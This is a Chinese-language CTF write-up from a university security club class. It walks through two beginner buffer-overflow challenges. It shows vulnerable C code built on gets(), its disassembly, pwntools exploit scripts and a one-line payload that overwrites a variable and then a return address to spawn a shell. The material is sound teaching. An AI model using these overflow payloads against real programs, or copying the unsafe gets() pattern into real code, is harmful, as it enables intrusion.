# [NSYSU 資安社課] Pwn Basic #1


經歷大約一學期的 CTF 洗禮，總算是對這分面稍微有些概念 : D  
原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文...

<!--more-->

<br>

作為第一篇 writeup，決定拿社課的習題練練手，一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考。另外就是可以給非資安背景的朋友簡單認識一下 Pwn ，否則每次被問到我也不曉得怎麼解釋（抹臉）

hmmm 不會解釋資安... 應該是我的問題才對Orz

<br><br>

"**Pwn**" 有人唸 Costco、有人唸 IKEA，總之我都唸"**胖**"或是"**碰**"。常見做法就是針對程式內的漏洞進行攻擊（提權），有種 "**player has been owned.**" 的意思。  
也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺～ 在CTF領域，Pwn 基礎題通常是給你讀取的無權限文字檔，希望你透過程式漏洞拿到 root 權限拿 flag。

以我來說，平常剛拿到題目比較會用到的幾個指令。
- `ls -al` 瞭解目錄下的檔案以及執行權限
- `file` 確認檔案類型以及位元數
- `checksec` 查看該ELF檔開啟了哪些保護機制

<br>
那接下來就開始解題囉！ovo
<br>

## 0x01: Password

首先，來看一下這題提供的檔案。

```text {linenos=false}
password
password.c
flag.txt
```

第一個檔案 `password` 用 `file` 指令可以查看關於password的檔案類型。

```bash {linenos=true}
$ file ./password
password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped
```

<br>

可以發現是屬於 Linux 底下的 ELF 執行檔，也是 CTF 內最常見的檔案類型，不過用 MacOS 的 Safari 載下來都會莫名被加上`.dms`，當時第一次看到還在思考檔案是不是壞了XD（用 `file` 查看是沒有問題），另外社課提供的 Pwn 基礎題以 `32-bits` 為主，比起 64-bits 相對單純方便教學。

再來就是直接執行看看... 咦？不能執行？

用 `ls` 發現這個檔案並沒有執行權限，可以用 `chmod` 改檔案權限。對其他細節有興趣的可以瞭解一下 [鳥哥私房菜 - Linux的檔案權限與目錄配置](https://linux.vbird.org/linux_basic/centos7/0210filepermission.php)。

```bash {linenos=false}
$ ls -al
-rw-r-xr-x@ [other information] password
$ chmod +x ./password
$ ls -al
-rwxr-xr-x@ [other information] password
```

<br>

修改完執行權限後可以先run一下看看程式大概要幹嘛。
在Pwn基礎題通常會刻意把一些**防禦機制**關掉，可以拿 `checksec` 指令看看該執行檔開了哪些保護，以password這題來說。

```shell {linenos=false}
$ checksec ./password
```

<pre>
Arch:     i386-32-little
RELRO:    <font color='EAC100'>Partial RELRO</font>
Stack:    <font color='FF0000'>No canary found</font>
NX:       <font color='009100'>NX enabled</font>
PIE:      <font color='FF0000'>No PIE (0x8048000)</font>
</pre>

第一次見到這些保護機制看不懂很正常，簡單講就是

1. `RELRO` 暫時還不會用到，主要適用於**防範 lazy Binding** 所造成的延伸問題
2. Stack 的 `canary` 關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是能 Buffer Overflow
3. `NX` 開啟表示不讓你塞些邪惡的command在程式內執行，之後也會有這部分的練習
4. `PIE` 關閉讓你分析執行檔時看到的會是"絕對位址"，若開啟就只看得到位址偏移量不容易拿來利用

> P.S. 另外還有一個沒出現在 `checksec` 的 `ASLR` ，主要是對於每次執行 stack 、heap ... etc. 的位址隨機化，避免攻擊者可以定位記憶體位址

之後根據社課這部分內容應該會再講詳細點，剛開始大概有個認知就行了。
然後，社課的基礎題還順便附了該執行程式的原始碼，~~╭(⊙Д⊙)╯佛心講師╭(⊙Д⊙)╯~~


```c {filename="password.c"} {linenos=true}
int main() {
    ...
    char password[12] = "12345678";
    char name[8];

    printf("What's your name? ");
    gets(name);
    printf("Hello %s\n", name);

    if (!strcmp(password, "password")) {
        puts("Welcome :) ");
        shell();
        return 0;
    }
    printf("QQ %s\n", password);
    exit(0);
}
```

這段 code 對於有寫過程式的各位應該都不困難。  
題意要求輸入 `name` ，然後會拿變數 `password` 和 "**password**" 進行比較，判斷式成立就能執行 `shell()`，可以發現當中並沒有任何要求輸入變數`password`，只有在最後會輸出 "QQ `password`"，若第一次接觸 Pwn 的看到這奇怪的判斷式應該會滿頭問號。

不過，我們可以先隨便輸入一些東西觀察看看，像是變數 `name` 大小為 8 bytes，輸入 "12345678"，會得到下面結果。

```shell {linenos=false}
$ What's your name? 12345678
$ Hello 12345678
QQ 
Segmentation fault
```

然而，如果輸入超過 8 bytes "1234567890"，會得到下列結果。

```shell {linenos=false}
$ What's your name? 1234567890
$ Hello 1234567890
QQ 90
Segmentation fault
```

嗯嗯？明明沒有對變數 `password` 輸入參數，但變數內容好像被偷改了XD

<br>

沒錯！這題主要想表達的事情是：

{{< admonition type=info title="Note" >}}
`gets()` 這輸入函式是不安全的，因為它不會限制使用者的輸入長度。  
因此若在**沒有 canary 的情況下**很容易遭受 **Buffer Overflow** 攻擊！
{{< /admonition >}}

以這題來說我們可以用反組譯指令 `objdump` 瞭解一下程式架構

```shell {linenos=false}
$ objdump -d -M intel ./password
```

Stack內容的部分畫成圖大概長得像這樣

![ ](https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618818959/blog-posts/2020-03/20-stack-frame-1.webp)

我們這次輸入改成 "aaaaaaaahaha" ， "haha" 就會蓋到變數 `password` 的值了。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618818959/blog-posts/2020-03/20-stack-frame-2.webp)


聰明的你應該知道怎麼做了吧 (｡･ω･｡)  
沒有錯的啦！將上面的 "haha" 改成 "password" 就能啟動 `shell()` 拿到 root 權限了！

話說回來，往後能夠透過手動輸入就破解的 Pwn 題並不常見，因此這類型的題目通常會搭配 Python 套件 `pwntool` 進行 exploit。

↓↓↓ 以這題來說用pwntool可以這樣寫 ↓↓↓

```python {linenos=table}
from pwn import *

# process:本機連線, remote:遠端連線
conn = process('./password')

# 根據程式內容設計輸入(payload)
payload = '12345678password'
print(payload)

# 傳送給程式後, 由於會執行shell需要用interactive()進行互動
conn.sendline(payload) 
conn.interactive()
```

<br>

光是第一題就寫了落落長...  
打 Pwn 一開始抓不到感覺還蠻正常，所以我希望能用step by step的方式解釋詳細一點，順便幫自己補充平常不太會深入的知識。

<br><br>

## 0x02: BOF

這題給的檔案有

```text {linenos=false}
bof
bof.c
flag.txt
```

同樣 flag 沒有讀取權限，我們一樣來看看 `bof` 執行檔有開了哪些保護。

<pre>
Arch:     i386-32-little
RELRO:    <font color='EAC100'>Partial RELRO</font>
Stack:    <font color='FF0000'>No canary found</font>
NX:       <font color='009100'>NX enabled</font>
PIE:      <font color='FF0000'>No PIE (0x8048000)</font>
</pre>

唔嗯... 可以發現和上一題形式上十分類似，再來看看`bof.c`原始碼的內容


```c {filename="bof.c"} {linenos=true}
void shell() {
    system("/bin/sh");
}

void vuln() {
    char str[48];
    printf("Input: ");
    gets(str);
    return;
}

int main() {
    ...
    vuln();
    return 0;
}
```

整體結構看起來和上一題沒什麼差別，也都是針對 `gets()` 的危險漏洞，只是這次... 完全沒辦法執行 `shell()` !!!

這題主要想表達的事情是：

{{< admonition type=info title="Note" >}}
利用 `gets()` 不限輸入長度的漏洞進行 Buffer Overflow。  
而且要把 `vuln()` 原本要回到 `main()` 的 return address 改成 `shell()` 的 address。
{{< /admonition >}}

嗯... 蛤!? ・ ࡇ ・  
我相信有學過 OS 的同學大概都不陌生，只是懂歸懂，但要怎麼做呢？

<br>

一樣先拿 `objdump` 一樣來看看裡頭長什麼樣子。

```shell {linenos=false}
$ objdump -d -M intel ./bof
```

```shell {linenos=true}
080484eb <shell>:
 80484eb:	55                   	push   ebp
 80484ec:	89 e5                	mov    ebp,esp
 80484ee:	68 e0 85 04 08       	push   0x80485e0
 80484f3:	e8 b8 fe ff ff       	call   80483b0 <system@plt>
 80484f8:	83 c4 04             	add    esp,0x4
 80484fb:	90                   	nop
 80484fc:	c9                   	leave
 80484fd:	c3                   	ret

080484fe <vuln>:
 80484fe:	55                   	push   ebp
 80484ff:	89 e5                	mov    ebp,esp
 8048501:	83 ec 30             	sub    esp,0x30
 8048504:	68 e8 85 04 08       	push   0x80485e8
 8048509:	e8 82 fe ff ff       	call   8048390 <printf@plt>
 804850e:	83 c4 04             	add    esp,0x4
 8048511:	8d 45 d0             	lea    eax,[ebp-0x30]
 8048514:	50                   	push   eax
 8048515:	e8 86 fe ff ff       	call   80483a0 <gets@plt>
 804851a:	83 c4 04             	add    esp,0x4
 804851d:	90                   	nop
 804851e:	c9                   	leave
 804851f:	c3                   	ret
```

重點在 line 18 的 `ebp-0x30` ，必須要掌握變數所在的相對位置，我們把 stack frame 畫成圖大概就是下面這樣 ↓↓↓

![ ](https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_500/v1618833040/blog-posts/2020-03/20-stack-frame-3.webp)

也就是說，這題希望我們除了把`str[48]`填滿
還要利用Buffer Overflow的方式把`shell()`的address蓋到return上。

再來就是要知道line 1 `shell()`的function address
假如我們通通用"a"進行覆蓋，預期結果將會長這樣：）
![ ](https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_500/v1618833040/blog-posts/2020-03/20-stack-frame-4.webp)

<br>

既然知道要怎麼蓋return address，剩下的就是寫payload了。

```python {filename="exploit.py"} {linenos=true}
from pwn import *

conn = process('./bof')

# payload分成三個部分: 填滿str[48], 覆蓋old ebp, 拿shell()覆蓋return address
# 要注意由於32位元是little-endian, 所以要用p32()轉成\xeb\x84\x04\x08的格式
payload = 'a'*48 + 'aaaa' + p32(0x080484eb)
print(payload)

conn.sendline(payload)
conn.interactive()
```

這樣就能拿到root權限讀flag，當然如果懶得開檔案寫code，也是有一行流寫法XD

```shell {linenos=false}
$ (python -c "print('a'*48 + 'a'*4 + '\xeb\x84\x04\x08')"; cat) | ./bof
```



<br>

大概就是這麼一回事了~  
寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了QQ

就醬，希望我還能繼續把題目補完（逃
